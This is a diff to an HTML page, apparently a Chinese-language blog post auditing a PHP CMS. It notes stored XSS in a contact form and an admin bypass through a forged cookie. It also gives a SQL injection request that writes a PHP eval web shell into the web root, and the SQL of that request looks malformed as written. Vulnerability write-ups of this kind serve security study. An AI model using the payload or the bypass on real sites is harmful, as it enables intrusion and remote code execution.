@@ -259,7 +259,7 @@
 <h3 id="file-contact-php"><a href="#file-contact-php" class="headerlink" title="/file/contact.php"></a>/file/contact.php</h3><p>这里留言是存在存储型xss的，因为昵称邮箱网址没过滤。</p>
 <h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211104134049.png" alt></p>
 <p>只要cookie传入admin就可以登入admin。</p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>由于这个cms对上传有处理，所以无法通过上传直接getshell。但是可以通过sql注入写入，前提是secure_file_priv为null。</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>由于这个cms对上传有处理，所以无法通过上传直接getshell。但是可以通过sql注入写入，前提是secure_file_priv为空。</p>
 <pre><code>?r=reply&amp;type=1&amp;id=1&#39;and select &#39;&lt;?php @eval($_POST[1]) ?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;;
 </code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看的困死了，还有很多不想看了，这个太简单了。</p>
 
